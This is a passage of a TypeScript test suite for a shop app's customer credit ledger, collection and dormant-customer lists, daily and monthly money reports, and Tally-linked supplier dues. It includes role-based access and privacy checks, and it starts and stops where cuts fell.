    expect(body.entries.map((row: { kind: string }) => row.kind)).toEqual([
      'PAYMENT_RECEIVED',
      'OPENING_BALANCE',
    ]);
    expect(Object.keys(body.entries[0]).sort()).toEqual([
      'amountPaise',
      'channel',
      'id',
      'kind',
      'on',
      'orderNumber',
    ]);
    const text = JSON.stringify(body);
    for (const secret of ['Paisa mila', 'Jhagda', 'late-payer', '987654', 'papa', 'tally', 'Tally'])
      expect(text).not.toContain(secret);
  });
  it('someone else’s entries never appear, however they ask', async () => {
    await signed('ramesh', 5000);
    await signed('suresh', 9000);
    await put('papa', 'admin/customers/ramesh/khata-view', { on: true }).expect(200);
    await put('papa', 'admin/customers/suresh/khata-view', { on: true }).expect(200);
    const { body } = await mine('ramesh', '?customerId=suresh').expect(200);
    expect(body.balancePaise).toBe(5000);
    expect(body.entries).toHaveLength(1);
    expect(body.entries[0].amountPaise).toBe(5000);
  });
  it('old entries cleared away before the opening are the shop’s housekeeping', async () => {
    const old = await post('papa', 'admin/customers/ramesh/khata/adjust', {
      amountPaise: 3000,
      note: 'Purana',
      occurredAt: addDays(today(), -10),
      idempotencyKey: randomUUID(),
    }).expect(201);
    await post('papa', `admin/customers/ramesh/khata/reverse/${old.body.id}`, {
      note: 'Sheet se',
      idempotencyKey: randomUUID(),
    }).expect(201);
    await signed('ramesh', 5000);
    await put('papa', 'admin/customers/ramesh/khata-view', { on: true }).expect(200);
    const { body } = await mine().expect(200);
    expect(body.entries.map((row: { kind: string }) => row.kind)).toEqual(['OPENING_BALANCE']);
    expect(body.balancePaise).toBe(5000);
  });
  it('turning it off hides it again at once', async () => {
    await signed('ramesh', 5000);
    await put('papa', 'admin/customers/ramesh/khata-view', { on: true }).expect(200);
    await put('papa', 'admin/customers/ramesh/khata-view', { on: false }).expect(200);
    expect((await mine().expect(200)).body).toEqual({ available: false });
  });
  it('pages, and refuses a forged cursor', async () => {
    await signed('ramesh', 5000);
    await put('papa', 'admin/customers/ramesh/khata-view', { on: true }).expect(200);
    await paid('ramesh', 100);
    await paid('ramesh', 200);
    const first = await mine('ramesh', '?limit=2').expect(200);
    expect(first.body.entries).toHaveLength(2);
    const second = await mine('ramesh', `?limit=2&cursor=${first.body.nextCursor}`).expect(200);
    expect(second.body.entries).toHaveLength(1);
    expect(second.body.nextCursor).toBeNull();
    await mine('ramesh', '?cursor=garbage').expect(400);
  });
  it('needs signing in, and a staff login has no khata', async () => {
    await request(server).get('/api/v1/me/khata').expect(401);
    expect((await mine('papa').expect(200)).body).toEqual({ available: false });
  });
});

describe('credit posts when the goods leave', () => {
  beforeEach(async () => {
    await db.user.update({
      where: { id: 'ramesh' },
      data: { creditAllowed: true, creditLimitPaise: 100000000 },
    });
  });
  const key = () => randomUUID();
  const report = (id: string) =>
    post('papa', `admin/orders/${id}/delivery`, {
      action: 'REPORT',
      reason: 'UNAVAILABLE',
      note: 'Ghar band',
      idempotencyKey: key(),
    });
  const sendOut = async () => {
    const order = await creditOrder();
    await move(order.id, 'PREPARING').expect(200);
    await move(order.id, 'OUT_FOR_DELIVERY').expect(200);
    return order;
  };
  const returned = (id: string, idempotencyKey = key()) =>
    post('papa', `admin/orders/${id}/delivery`, {
      action: 'RETURN',
      note: 'Maal wapas',
      idempotencyKey,
      items: [{ productId: 'cement', sellableQuantity: 1, damagedQuantity: 0 }],
    });

  it('nothing is owed while it is only an order', async () => {
    const order = await creditOrder();
    await move(order.id, 'PREPARING').expect(200);
    expect(await ledger(order.id)).toEqual([]);
    expect(await balance('ramesh')).toBe(0);
  });
  it('going out posts it, and delivery adds nothing', async () => {
    const order = await sendOut();
    expect(await ledger(order.id)).toMatchObject([
      { kind: 'SALE_ON_CREDIT', amountPaise: order.totalPaise, locationId: MAIN },
    ]);
    expect(await balance('ramesh')).toBe(order.totalPaise);
    await move(order.id, 'DELIVERED').expect(200);
    expect(await ledger(order.id)).toHaveLength(1);
    expect(await balance('ramesh')).toBe(order.totalPaise);
  });
  it('loading posts it first, and going out and delivery add nothing', async () => {
    const order = await creditOrder();
    await post('keeper', `staff/stock/loads/${order.id}`, {
      idempotencyKey: key(),
      vehicle: 'Trolley',
    }).expect(201);
    expect(await ledger(order.id)).toHaveLength(1);
    expect((await db.order.findUniqueOrThrow({ where: { id: order.id } })).status).toBe(
      'PREPARING',
    );
    await move(order.id, 'OUT_FOR_DELIVERY').expect(200);
    await move(order.id, 'DELIVERED').expect(200);
    expect(await ledger(order.id)).toHaveLength(1);
    expect(await balance('ramesh')).toBe(order.totalPaise);
  });
  it('a retried load posts once', async () => {
    const order = await creditOrder();
    const body = { idempotencyKey: key(), vehicle: 'Trolley' };
    await post('keeper', `staff/stock/loads/${order.id}`, body).expect(201);
    await post('keeper', `staff/stock/loads/${order.id}`, body).expect(201);
    expect(await ledger(order.id)).toHaveLength(1);
  });
  it('loaded and then cancelled takes it off again, with a visible reversal', async () => {
    const order = await creditOrder();
    await post('keeper', `staff/stock/loads/${order.id}`, {
      idempotencyKey: key(),
      vehicle: 'Trolley',
    }).expect(201);
    await move(order.id, 'CANCELLED').expect(200);
    expect(await balance('ramesh')).toBe(0);
    const entries = await db.customerLedgerEntry.findMany({
      where: { customerId: 'ramesh' },
      orderBy: { createdAt: 'asc' },
    });
    expect(entries.map((row) => row.kind)).toEqual(['SALE_ON_CREDIT', 'REVERSAL']);
    expect(entries[1]!.reversesId).toBe(entries[0]!.id);
  });
  it('cancelled before it left never touches the khata', async () => {
    const order = await creditOrder();
    await move(order.id, 'PREPARING').expect(200);
    await move(order.id, 'CANCELLED').expect(200);
    expect(await db.customerLedgerEntry.count({ where: { customerId: 'ramesh' } })).toBe(0);
  });
  it('the load coming back reverses it, and a retried return does so once', async () => {
    const order = await sendOut();
    await report(order.id).expect(201);
    const retryKey = key();
    await returned(order.id, retryKey).expect(201);
    await returned(order.id, retryKey).expect(201);
    expect(await balance('ramesh')).toBe(0);
    expect(
      await db.customerLedgerEntry.count({ where: { customerId: 'ramesh', kind: 'REVERSAL' } }),
    ).toBe(1);
    expect((await db.order.findUniqueOrThrow({ where: { id: order.id } })).status).toBe(
      'CANCELLED',
    );
  });
  it('a failed trip that goes out again and arrives is still one sale', async () => {
    const order = await sendOut();
    await report(order.id).expect(201);
    expect(await balance('ramesh')).toBe(order.totalPaise);
    await post('papa', `admin/orders/${order.id}/delivery`, {
      action: 'RETRY',
      retryDate: today(),
      note: 'Dobara',
      idempotencyKey: key(),
    }).expect(201);
    await move(order.id, 'DELIVERED').expect(200);
    expect(await ledger(order.id)).toHaveLength(1);
    expect(await balance('ramesh')).toBe(order.totalPaise);
  });
  it('an owner’s manual reversal is not repeated when the load comes back', async () => {
    const order = await sendOut();
    const [sale] = await ledger(order.id);
    await post('papa', `admin/customers/ramesh/khata/reverse/${sale!.id}`, {
      note: 'Galat entry',
      idempotencyKey: key(),
    }).expect(201);
    await report(order.id).expect(201);
    await returned(order.id).expect(201);
    expect(await balance('ramesh')).toBe(0);
    expect(
      await db.customerLedgerEntry.count({ where: { customerId: 'ramesh', kind: 'REVERSAL' } }),
    ).toBe(1);
  });
  it('a manual reversal is not posted again on delivery', async () => {
    const order = await sendOut();
    const [sale] = await ledger(order.id);
    await post('papa', `admin/customers/ramesh/khata/reverse/${sale!.id}`, {
      note: 'Galat entry',
      idempotencyKey: key(),
    }).expect(201);
    await move(order.id, 'DELIVERED').expect(200);
    expect(await balance('ramesh')).toBe(0);
    expect(await ledger(order.id)).toHaveLength(1);
  });
  it('cash orders never reach the khata', async () => {
    const order = await creditOrder('+919000006001', { paymentMethod: 'COD' });
    await move(order.id, 'PREPARING').expect(200);
    await move(order.id, 'OUT_FOR_DELIVERY').expect(200);
    expect(await db.customerLedgerEntry.count()).toBe(0);
  });
  it('the limit counts an order once, before and after it leaves', async () => {
    const order = await creditOrder();
    await db.user.update({
      where: { id: 'ramesh' },
      data: { creditLimitPaise: order.totalPaise * 2 },
    });
    await move(order.id, 'PREPARING').expect(200);
    await move(order.id, 'OUT_FOR_DELIVERY').expect(200);
    // It has left, so it is in the balance. It must not also be counted as pending.
    const second = await creditOrder();
    await move(second.id, 'CANCELLED').expect(200);
    await db.user.update({
      where: { id: 'ramesh' },
      data: { creditLimitPaise: order.totalPaise * 2 - 1 },
    });
    const third = await post('papa', 'admin/orders/phone', {
      customerPhone: '+919000006001',
      customerName: 'Customer',
      address: address(),
      items: [{ productId: 'cement', quantity: 1 }],
      deliveryDate: 'today',
      paymentMethod: 'CREDIT',
      idempotencyKey: key(),
    });
    expect(third.status).toBe(409);
    expect(third.body.error.code).toBe('CREDIT_LIMIT_EXCEEDED');
    expect(third.body.error.details.exposurePaise).toBe(order.totalPaise * 2);
  });
  it('an order waiting to leave still counts against the limit', async () => {
    const order = await creditOrder();
    await db.user.update({
      where: { id: 'ramesh' },
      data: { creditLimitPaise: order.totalPaise * 2 - 1 },
    });
    const res = await post('papa', 'admin/orders/phone', {
      customerPhone: '+919000006001',
      customerName: 'Customer',
      address: address(),
      items: [{ productId: 'cement', quantity: 1 }],
      deliveryDate: 'today',
      paymentMethod: 'CREDIT',
      idempotencyKey: key(),
    });
    expect(res.status).toBe(409);
    expect(res.body.error.details.exposurePaise).toBe(order.totalPaise * 2);
  });
  it('the money report nets a returned sale to nothing', async () => {
    const order = await sendOut();
    await report(order.id).expect(201);
    await returned(order.id).expect(201);
    const { body } = await get('papa', `admin/reports/money?from=${today()}&to=${today()}`).expect(
      200,
    );
    expect(body.creditSalesPaise).toBe(0);
  });
  it('a loaded order cannot be taken back with Wapas lo', async () => {
    const order = await creditOrder();
    await db.order.update({ where: { id: order.id }, data: { status: 'AWAITING_CONFIRMATION' } });
    await confirmOrder(server, db, tokenFor('papa'), order.id);
    await post('keeper', `staff/stock/loads/${order.id}`, {
      idempotencyKey: key(),
      vehicle: 'Trolley',
    }).expect(201);
    // Crash between the load and the status step: the order still says Confirmed.
    await db.order.update({ where: { id: order.id }, data: { status: 'CONFIRMED' } });
    const fresh = await db.order.findUniqueOrThrow({ where: { id: order.id } });
    const res = await post('papa', `admin/orders/${order.id}/undo-decision`, {
      expectedVersion: fresh.version,
    });
    expect(res.status).toBe(409);
    expect(res.body.error.code).toBe('ORDER_CHANGED');
    expect(await balance('ramesh')).toBe(order.totalPaise);
  });
});

describe('Shaam ka hisaab', () => {
  const money = async (locationId: string, kind: string, channel: string, amountPaise: number) =>
    db.financialMovement.create({
      data: { kind, channel, amountPaise, locationId, actorId: 'papa', occurredAt: new Date() },
    });
  it('adds the day up by channel, for the owner and for a manager’s own shop', async () => {
    await money(MAIN, 'COLLECTION', 'CASH', 1000);
    await money(MAIN, 'COUNTER_SALE', 'UPI', 2000);
    await money(MAIN, 'REFUND', 'CASH', 100);
    await money(SECOND, 'COLLECTION', 'CASH', 5000);
    await money(SECOND, 'COLLECTION', 'ONLINE', 7000);
    await money(MAIN, 'COLLECTION', '', 11);
    const owner = (await get('papa', 'admin/reports/shaam').expect(200)).body;
    expect(owner.moneyIn).toEqual({
      cashPaise: 5900,
      upiPaise: 2000,
      onlinePaise: 7000,
      otherPaise: 11,
      totalPaise: 14911,
    });
    const manager = (await get('manager', 'admin/reports/shaam').expect(200)).body;
    expect(manager.moneyIn).toMatchObject({ cashPaise: 900, upiPaise: 2000, totalPaise: 2911 });
    const askedB = (await get('papa', `admin/reports/shaam?locationId=${SECOND}`).expect(200)).body;
    expect(askedB.moneyIn.totalPaise).toBe(12000);
  });
  it('shows udhaar given and received, net of what was reversed', async () => {
    await db.user.update({
      where: { id: 'ramesh' },
      data: { creditAllowed: true, creditLimitPaise: 100000000 },
    });
    const order = await creditOrder();
    await move(order.id, 'PREPARING').expect(200);
    await move(order.id, 'OUT_FOR_DELIVERY').expect(200);
    await signed('suresh', 90000);
    const payment = await paid('suresh', 3000);
    await paid('suresh', 500);
    await post('papa', `admin/customers/suresh/khata/reverse/${payment.body.id}`, {
      note: 'Laut gaya',
      idempotencyKey: randomUUID(),
    }).expect(201);
    const { body } = await get('papa', 'admin/reports/shaam').expect(200);
    expect(body.udhaarGivenPaise).toBe(order.totalPaise);
    expect(body.udhaarReceivedPaise).toBe(500);
    expect(body.orders).toBe(1);
  });
  it('counts shops closed and the latest difference, after a correction', async () => {
    const day = today();
    const first = await db.dayClose.create({
      data: {
        locationId: MAIN,
        day,
        expectedPaise: 1000,
        countedPaise: 900,
        differencePaise: -100,
        reason: 'Gin liya',
        closedById: 'papa',
      },
    });
    await db.dayClose.create({
      data: {
        locationId: MAIN,
        day,
        expectedPaise: 1000,
        countedPaise: 950,
        differencePaise: -50,
        reason: 'Dobara gina',
        closedById: 'papa',
        supersedesId: first.id,
      },
    });
    const { body } = await get('papa', 'admin/reports/shaam').expect(200);
    expect(body.galla).toMatchObject({ closed: 1, differencePaise: -50 });
    expect(body.galla.shops).toBeGreaterThanOrEqual(2);
    const b = (await get('managerb', 'admin/reports/shaam').expect(200)).body;
    expect(b.galla).toEqual({ shops: 1, closed: 0, differencePaise: 0 });
  });
  it('refuses a future day and a made-up one', async () => {
    await get('papa', `admin/reports/shaam?day=${addDays(today(), 1)}`).expect(400);
    await get('papa', 'admin/reports/shaam?day=2026-02-31').expect(400);
    await get('papa', 'admin/reports/shaam?day=garbage').expect(400);
  });
  it('a past day reads as that day', async () => {
    const yesterday = addDays(today(), -1);
    await db.financialMovement.create({
      data: {
        kind: 'COLLECTION',
        channel: 'CASH',
        amountPaise: 300,
        locationId: MAIN,
        actorId: 'papa',
        occurredAt: new Date(`${yesterday}T12:00:00+05:30`),
      },
    });
    const { body } = await get('papa', `admin/reports/shaam?day=${yesterday}`).expect(200);
    expect(body.moneyIn.totalPaise).toBe(300);
    expect((await get('papa', 'admin/reports/shaam').expect(200)).body.moneyIn.totalPaise).toBe(0);
  });
});

describe('the Vasooli list', () => {
  const list = async (who: string, query = '') =>
    (await get(who, `admin/reports/vasooli${query}`).expect(200)).body;
  it('lists only signed balances, biggest first, and counts the rest', async () => {
    await signed('ramesh', 5000);
    await signed('suresh', 9000);
    await db.user.update({ where: { id: 'mohan' }, data: { khataBalancePaise: 12345 } });
    const body = await list('papa');
    expect(body.items.map((row: { id: string }) => row.id)).toEqual(['suresh', 'ramesh']);
    expect(body).toMatchObject({
      totalDuePaise: 14000,
      customersWithDue: 2,
      unsigned: { customers: 1 },
    });
    expect(JSON.stringify(body)).not.toContain('12345');
  });
  it('shows age, last money, last reminder and the promise', async () => {
    await signed('ramesh', 50000, MAIN, addDays(today(), -40));
    await paid('ramesh', 1000);
    await remind('papa', 'ramesh').expect(201);
    const call = await made('papa', 'ramesh', { kind: 'PAYMENT', promisedPaise: 7000 });
    await db.followUp.update({ where: { id: call.id }, data: { dueOn: addDays(today(), -1) } });
    const [row] = (await list('papa')).items;
    expect(row).toMatchObject({
      balancePaise: 49000,
      ageDays: 40,
      fromOpening: true,
      oldestDueOn: addDays(today(), -40),
      lastPaymentOn: today(),
      lastPaymentPaise: 1000,
      promise: { state: 'BROKEN', promisedPaise: 7000, followUpId: call.id },
      reminderBlocked: null,
    });
    expect(row.lastRemindedAt).toBeTruthy();
  });
  it('payments clear the oldest debt first, so age follows what is left', async () => {
    await signed('ramesh', 1000, MAIN, addDays(today(), -60));
    await post('papa', 'admin/customers/ramesh/khata/adjust', {
      amountPaise: 500,
      note: 'Baad ka',
      occurredAt: addDays(today(), -10),
      idempotencyKey: randomUUID(),
    }).expect(201);
    expect((await list('papa')).items[0].ageDays).toBe(60);
    await paid('ramesh', 1000);
    expect((await list('papa')).items[0]).toMatchObject({ ageDays: 10, fromOpening: false });
  });
  it('a reversed sale is no debt', async () => {
    await signed('ramesh', 100, MAIN, addDays(today(), -60));
    const later = await post('papa', 'admin/customers/ramesh/khata/adjust', {
      amountPaise: 900,
      note: 'Galti',
      occurredAt: addDays(today(), -5),
      idempotencyKey: randomUUID(),
    }).expect(201);
    await post('papa', `admin/customers/ramesh/khata/reverse/${later.body.id}`, {
      note: 'Kaat do',
      idempotencyKey: randomUUID(),
    }).expect(201);
    expect((await list('papa')).items[0]).toMatchObject({ balancePaise: 100, ageDays: 60 });
  });
  it('someone who has paid in full, or holds an advance, is not on it', async () => {
    await signed('ramesh', 1000);
    await paid('ramesh', 1000);
    await signed('suresh', -500);
    expect((await list('papa')).items).toEqual([]);
  });
  it('a stop shows on the row', async () => {
    await signed('ramesh', 1000);
    await put('papa', 'admin/customers/ramesh/reminder-stop', { stopped: true }).expect(200);
    expect((await list('papa')).items[0].reminderBlocked).toBe('STOPPED');
  });
  it('a manager sees their shop’s, and the shops add up to the firm', async () => {
    await signed('ramesh', 5000, MAIN);
    await signed('suresh', 9000, SECOND);
    const a = await list('manager');
    const b = await list('managerb');
    expect(a.items.map((row: { id: string }) => row.id)).toEqual(['ramesh']);
    expect(b.items.map((row: { id: string }) => row.id)).toEqual(['suresh']);
    const firm = await list('papa');
    expect(a.totalDuePaise + b.totalDuePaise).toBe(firm.totalDuePaise);
    await get('manager', `admin/reports/vasooli?locationId=${SECOND}`).expect(403);
    expect((await list('papa', `?locationId=${SECOND}`)).items).toHaveLength(1);
  });
  it('a customer’s whole balance moves to the shop that last gave credit', async () => {
    await signed('ramesh', 5000, MAIN);
    expect((await list('manager')).items).toHaveLength(1);
    const order = await creditOrder('+919000006001', { locationId: SECOND });
    await move(order.id, 'PREPARING').expect(200);
    await move(order.id, 'OUT_FOR_DELIVERY').expect(200);
    expect((await list('manager')).items).toHaveLength(0);
    expect((await list('managerb')).items[0].balancePaise).toBe(5000 + order.totalPaise);
  });
  it('pages, and the accountant’s copy has no numbers', async () => {
    await signed('ramesh', 5000);
    await signed('suresh', 9000);
    const first = await list('accountant', '?limit=1');
    expect(first.items[0]).toMatchObject({
      id: 'suresh',
      phone: null,
      phoneMasked: '+91XXXXXXX002',
    });
    expect(JSON.stringify(first)).not.toContain('9000006002');
    const second = await list('accountant', `?limit=1&cursor=${first.nextCursor}`);
    expect(second.items[0].id).toBe('ramesh');
    expect(second.nextCursor).toBeNull();
    await get('papa', 'admin/reports/vasooli?cursor=garbage').expect(400);
    await get('papa', 'admin/reports/vasooli?limit=9999').expect(400);
  });
  it.each(['cashier', ...outsiders])('%s may not read it', async (who) => {
    await get(who, 'admin/reports/vasooli').expect(403);
    await get(who, 'admin/reports/vasooli.csv').expect(403);
  });
});

describe('Chup grahak', () => {
  const longAgo = (days: number) => new Date(Date.now() - days * 86400000);
  /** Real delivered orders, at the days given, at one shop. */
  const history = async (customerId: string, days: number[], locationId = MAIN, total = 40000) => {
    for (const age of days)
      await db.order.create({
        data: {
          number: `SC-${randomUUID()}`,
          userId: customerId,
          idempotencyKey: randomUUID(),
          status: 'DELIVERED',
          source: 'PHONE',
          address: { area: 'Kankarbagh', phone: '' },
          deliveryDate: today(),
          notes: '',
          subtotalPaise: total,
          deliveryFeePaise: 0,
          totalPaise: total,
          locationId,
          createdAt: longAgo(age),
          items: {
            create: {
              productId: 'cement',
              name: 'Test cement',
              unit: 'bag',
              quantity: 2,
              pricePaise: 20000,
              listPricePaise: 20000,
              priceVersion: 1,
              lineTotalPaise: 40000,
            },
          },
        },
      });
    await db.user.update({
      where: { id: customerId },
      data: { lastOrderAt: longAgo(Math.min(...days)) },
    });
  };
  const list = async (who = 'papa', query = '') =>
    (await get(who, `admin/crm/dormant${query}`).expect(200)).body;
  const ids = (body: { items: { id: string }[] }) => body.items.map((row) => row.id);

  it('finds a regular gone quiet, with plain facts and no score', async () => {
    await history('ramesh', [50, 60, 70]);
    const body = await list();
    expect(ids(body)).toEqual(['ramesh']);
    expect(body.items[0]).toMatchObject({
      orders: 3,
      quietDays: 50,
      usualGapDays: 10,
      yearPaise: 120000,
      lastMaterial: 'Test cement',
      lastRatePaise: 20000,
      lastUnit: 'bag',
      site: 'Kankarbagh',
      reminderBlocked: null,
    });
    expect(Object.keys(body.items[0]).join()).not.toMatch(/score|rank|risk/i);
    expect(body.rule).toMatchObject({ minOrders: 3, minQuietDays: 45, timesUsualGap: 2 });
  });
  it('leaves out one or two orders, and anyone recent', async () => {
    await history('ramesh', [50, 60]);
    await history('suresh', [10, 20, 30]);
    expect(ids(await list())).toEqual([]);
  });
  it('someone who always takes months is not quiet at 45 days', async () => {
    await history('ramesh', [60, 120, 180, 240]);
    expect(ids(await list())).toEqual([]);
    await history('suresh', [130, 190, 250, 310]);
    expect(ids(await list())).toEqual(['suresh']);
  });
  it('cancelled orders do not count as buying', async () => {
    await history('ramesh', [50, 60, 70]);
    await db.order.updateMany({ where: { userId: 'ramesh' }, data: { status: 'CANCELLED' } });
    expect(ids(await list())).toEqual([]);
  });
  it('anything past the year does not count', async () => {
    await history('ramesh', [50, 400, 500]);
    expect(ids(await list())).toEqual([]);
  });
  it('leaves alone a finished house, a closed account, staff and the walk-in row', async () => {
    await history('ramesh', [50, 60, 70]);
    await history('suresh', [50, 60, 70]);
    await history('mohan', [50, 60, 70]);
    await db.user.update({ where: { id: 'ramesh' }, data: { tags: ['ghar-ban-gaya'] } });
    await db.user.update({ where: { id: 'suresh' }, data: { deletedAt: new Date() } });
    await db.user.update({ where: { id: 'mohan' }, data: { role: 'ADMIN' } });
    expect(ids(await list())).toEqual([]);
  });
  it('someone already being looked after does not come back', async () => {
    await history('ramesh', [50, 60, 70]);
    await history('suresh', [50, 60, 70]);
    await history('mohan', [50, 60, 70]);
    await made('papa', 'ramesh');
    await post('papa', 'admin/customers/suresh/contacts', {
      channel: 'CALL',
      purpose: 'Baat ki',
    }).expect(201);
    expect(ids(await list())).toEqual(['mohan']);
  });
  it('a sale in the books means they are not quiet', async () => {
    await history('ramesh', [50, 60, 70]);
    await history('suresh', [50, 60, 70]);
    const company = await db.tallyCompany.create({
      data: { guid: 'g1', name: 'Sample books', role: 'PRIMARY' },
    });
    await db.tallyLedger.create({
      data: {
        companyId: company.id,
        guid: 'l1',
        alterId: 1n,
        name: 'Ramesh ledger',
        parent: 'Sundry Debtors',
        class: 'DEBTOR',
      },
    });
    await db.tallyPartyLink.create({
      data: {
        companyId: company.id,
        guid: 'l1',
        userId: 'ramesh',
        status: 'LINKED',
        confirmedById: 'papa',
      },
    });
    await db.tallyVoucher.create({
      data: {
        companyId: company.id,
        guid: 'v1',
        alterId: 1n,
        date: addDays(today(), -5),
        baseType: 'Sales',
        party: 'Ramesh ledger',
        partyGuid: 'l1',
        partyAmountPaise: -100000n,
      },
    });
    expect(ids(await list())).toEqual(['suresh']);
  });
  it('whoever spent most comes first, and no more than ten rows', async () => {
    await history('ramesh', [50, 60, 70], MAIN, 1000);
    await history('suresh', [50, 60, 70], MAIN, 9000);
    expect(ids(await list())).toEqual(['suresh', 'ramesh']);
    for (let index = 0; index < 12; index++) {
      const id = `quiet${index}`;
      await addPerson(db, { id, phone: `+9190000070${String(index).padStart(2, '0')}` });
      await history(id, [50, 60, 70]);
    }
    const body = await list();
    expect(body.items).toHaveLength(10);
    expect(body.total).toBe(14);
  });
  it('a manager sees those who last bought at their shop', async () => {
    await history('ramesh', [50, 60, 70], MAIN);
    await history('suresh', [50, 60, 70], SECOND);
    expect(ids(await list('manager'))).toEqual(['ramesh']);
    expect(ids(await list('managerb'))).toEqual(['suresh']);
    await get('manager', `admin/crm/dormant?locationId=${SECOND}`).expect(403);
    expect(ids(await list('papa', `?locationId=${SECOND}`))).toEqual(['suresh']);
  });
  it('someone who asked not to be messaged is still listed, for a call, with no message', async () => {
    await history('ramesh', [50, 60, 70]);
    await put('papa', 'admin/customers/ramesh/reminder-stop', { stopped: true }).expect(200);
    expect((await list()).items[0].reminderBlocked).toBe('STOPPED');
  });
  it('the accountant’s copy has no numbers, and the outsiders and cashier get nothing', async () => {
    await history('ramesh', [50, 60, 70]);
    const body = await list('accountant');
    expect(body.items[0]).toMatchObject({ phone: null, phoneMasked: '+91XXXXXXX001' });
    expect(JSON.stringify(body)).not.toContain('9000006001');
    for (const who of ['cashier', ...outsiders]) {
      await get(who, 'admin/crm/dormant').expect(403);
      await get(who, 'admin/reports/chup-grahak.csv').expect(403);
    }
  });
});

describe('Mahine ka saar', () => {
  const month = () => today().slice(0, 7);
  const sold = async (customerId: string, locationId: string, total: number) =>
    db.order.create({
      data: {
        number: `SC-${randomUUID()}`,
        userId: customerId,
        idempotencyKey: randomUUID(),
        status: 'DELIVERED',
        source: 'PHONE',
        address: {},
        deliveryDate: today(),
        notes: '',
        subtotalPaise: total,
        deliveryFeePaise: 0,
        totalPaise: total,
        locationId,
        items: {
          create: {
            productId: 'cement',
            name: 'Test cement',
            unit: 'bag',
            quantity: 2,
            pricePaise: total / 2,
            listPricePaise: total / 2,
            priceVersion: 1,
            lineTotalPaise: total,
          },
        },
      },
    });
  it('adds up sales by material and the top customers, by shop for a manager', async () => {
    await sold('ramesh', MAIN, 5000);
    await sold('ramesh', MAIN, 1000);
    await sold('suresh', SECOND, 9000);
    const owner = (await get('papa', 'admin/reports/mahine').expect(200)).body;
    expect(owner).toMatchObject({ month: month(), appSalesPaise: 15000 });
    expect(owner.materials).toEqual([
      { productId: 'cement', name: 'Test cement', unit: 'bag', quantity: 6, totalPaise: 15000 },
    ]);
    expect(owner.topCustomers.map((row: { id: string }) => row.id)).toEqual(['suresh', 'ramesh']);
    expect(owner.topCustomers[1]).toMatchObject({ totalPaise: 6000, orders: 2 });
    const manager = (await get('manager', 'admin/reports/mahine').expect(200)).body;
    expect(manager.appSalesPaise).toBe(6000);
    expect(manager.topCustomers.map((row: { id: string }) => row.id)).toEqual(['ramesh']);
    await get('manager', `admin/reports/mahine?locationId=${SECOND}`).expect(403);
  });
  it('udhaar at the start and end of the month adds up, and an advance does not lower it', async () => {
    const lastMonth = addDays(`${month()}-01`, -5);
    await signed('ramesh', 5000, MAIN, lastMonth);
    await signed('suresh', -300, MAIN, lastMonth);
    await paid('ramesh', 1000);
    const { body } = await get('papa', 'admin/reports/mahine').expect(200);
    expect(body.udhaar).toMatchObject({
      startPaise: 5000,
      endPaise: 4000,
      givenPaise: 0,
      receivedPaise: 1000,
      otherPaise: 0,
    });
    const before = (
      await get('papa', `admin/reports/mahine?month=${lastMonth.slice(0, 7)}`).expect(200)
    ).body;
    // The month a signed opening landed in says so, or the column would not add up.
    expect(before.udhaar).toMatchObject({ startPaise: 0, endPaise: 5000, otherPaise: 5000 });
    const b = (await get('managerb', 'admin/reports/mahine').expect(200)).body;
    expect(b.udhaar).toMatchObject({ startPaise: 0, endPaise: 0 });
    expect((await get('manager', 'admin/reports/mahine').expect(200)).body.udhaar.endPaise).toBe(
      4000,
    );
  });
  it('refuses a future month and nonsense', async () => {
    const next = addDays(`${month()}-28`, 7).slice(0, 7);
    for (const asked of [next, '2026-13', 'garbage', '2026-1'])
      expect(
        (await get('papa', `admin/reports/mahine?month=${asked}`).expect(400)).body.error.code,
      ).toBe('BAD_MONTH');
  });
  it('the books are in it for owners and the accountant, and not even named for a manager', async () => {
    const owner = (await get('papa', 'admin/reports/mahine').expect(200)).body;
    expect(owner.tally).toEqual({ connected: false });
    expect((await get('accountant', 'admin/reports/mahine').expect(200)).body.tally).toEqual({
      connected: false,
    });
    const manager = await get('manager', 'admin/reports/mahine').expect(200);
    expect(JSON.stringify(manager.body).toLowerCase()).not.toContain('tally');
    const csv = await get('manager', 'admin/reports/mahine.csv').expect(200);
    expect(csv.text.toLowerCase()).not.toContain('tally');
  });
  it('with the books connected, shows supplier dues and their sales beside the app’s', async () => {
    const company = await db.tallyCompany.create({
      data: { guid: 'g1', name: 'Sample books', role: 'PRIMARY' },
    });
    await db.tallyLedger.create({
      data: {
        companyId: company.id,
        guid: 'sup1',
        alterId: 1n,
        name: 'Sample supplier',
        parent: 'Sundry Creditors',
        class: 'CREDITOR',
        closingPaise: 90071992547409931n,
        closingAsOf: new Date(),
      },
    });
    await db.tallyVoucher.create({
      data: {
        companyId: company.id,
        guid: 'v1',
        alterId: 1n,
        date: today(),
        baseType: 'Sales',
        party: 'x',
        partyAmountPaise: -123400n,
      },
    });
    const { body } = await get('papa', 'admin/reports/mahine').expect(200);
    expect(body.tally).toMatchObject({
      connected: true,
      salesPaise: '123400',
      suppliers: { totalPaise: '90071992547409931' },
    });
    const csv = await get('papa', 'admin/reports/mahine.csv').expect(200);
    expect(csv.text).toContain('900719925474099.31');
  });
  it.each(['cashier', ...outsiders])('%s may not read it', async (who) => {
    await get(who, 'admin/reports/mahine').expect(403);
    await get(who, 'admin/reports/mahine.csv').expect(403);
    await get(who, 'admin/reports/shaam').expect(403);
    await get(who, 'admin/reports/shaam.csv').expect(403);
  });
});

describe('supplier dues', () => {
  it('says plainly when the books are not connected', async () => {
    const { body } = await get('papa', 'admin/tally/suppliers').expect(200);
    expect(body).toEqual({ connected: false, items: [] });
  });
  it('lists creditors biggest first, as strings, from the primary books only', async () => {
    const company = await db.tallyCompany.create({
      data: { guid: 'g1', name: 'Sample books', role: 'PRIMARY' },
    });
    const copy = await db.tallyCompany.create({
      data: { guid: 'g2', name: 'Branch copy', role: 'BRANCH_COPY' },
    });
    const ledger_ = (companyId: string, guid: string, closingPaise: bigint, klass = 'CREDITOR') =>
      db.tallyLedger.create({
        data: {
          companyId,
          guid,
          alterId: 1n,
          name: `Sample ${guid}`,
          parent: 'Sundry Creditors',
          class: klass,
          closingPaise,
          closingAsOf: new Date(),
        },
      });
    await ledger_(company.id, 'small', 100n);
    await ledger_(company.id, 'big', 90071992547409931n);
    await ledger_(company.id, 'debtor', 999n, 'DEBTOR');
    await ledger_(copy.id, 'copied', 5000n);
    await db.tallyVoucher.create({
      data: {
        companyId: company.id,
        guid: 'p1',
        alterId: 1n,
        date: '2026-10-01',
        baseType: 'Purchase',
        party: 'Sample big',
        partyGuid: 'big',
        partyAmountPaise: 500n,
      },
    });
